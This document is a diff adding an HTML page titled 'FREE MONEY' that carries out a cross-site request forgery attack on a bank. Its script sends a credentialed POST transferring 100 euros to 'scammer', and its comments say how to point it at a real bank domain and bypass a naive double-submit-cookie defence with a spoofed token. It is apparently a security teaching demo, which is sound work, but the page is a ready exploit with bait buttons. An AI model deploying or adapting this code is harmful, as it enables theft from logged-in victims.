@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="icon" type="image/svg+xml"
+        href="https://static-00.iconduck.com/assets.00/money-mouth-face-emoji-512x512-qnbojb0r.png" />
+    <title>FREE MONEY</title>
+</head>
+
+<body>
+    <script>
+        const handleClick = async (method) => {
+            // Send a POST request to the bank to transfer 100 euros to the scammer
+            // Change st.bank to the bank's domain
+            // Change YOUR-SPOOFED-TOKEN to the token you passed to client to bypass Naive double submit cookie
+            const response = await fetch(`https://st.bank/${method}?amount=100&recipient=scammer&description=ez&cors=YOUR-SPOOFED-TOKEN`, {
+                method: "POST",
+                credentials: "include",
+                mode: "no-cors",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                }
+            });
+
+            console.log(await response.json());
+        };
+    </script>
+
+    <div style="display: flex; flex-direction: column; gap: 2px; width: 300px;">
+        <span>Unsafe endpoint</span>
+        <button onclick="handleClick('transfer')">FREE 100
+            EUROS!!!</button>
+        <span>Naive double submit cookie</span>
+        <button onclick="handleClick('transfer/naive')">FREE 100 EUROS!!!</button>
+    </div>
+</body>
+
+</html>
